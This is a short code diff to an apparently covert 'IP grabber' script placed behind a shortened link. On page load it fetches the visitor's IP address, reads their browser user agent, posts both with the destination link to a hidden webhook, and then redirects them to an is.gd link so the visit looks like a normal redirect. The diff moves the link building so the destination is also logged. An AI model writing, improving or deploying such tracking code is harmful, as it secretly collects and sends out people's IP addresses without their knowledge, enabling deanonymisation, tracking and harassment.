@@ -15,17 +15,16 @@ var userAgent=navigator.userAgent;
 let resp= await fetch("https://httpbin.org/ip");
 var ip= await resp.json();
 ip=ip.origin;
-msg={content:"=========\n\nIP: "+ip+"\nUser-Agent: "+userAgent+"\n\n========="}
+const params=new URLSearchParams(window.location.search);
+const gd=params.get("gd");
+let link="https://is.gd/"+gd;
+msg={content:"=========\n\nIP: "+ip+"\nUser-Agent: "+userAgent+"\n\nIndo para: "+link+"\n\n========="}
 await fetch(webhookURL,{
 method: "POST",
 headers: {"Content-Type":"application/json"},
 body: JSON.stringify(msg)
 });
-const params=new URLSearchParams(window.location.search);
-const gd=params.get("gd")
-const link="https://is.gd/"+gd
 window.location.href=link;
-
 }
 rodar();
 </script>
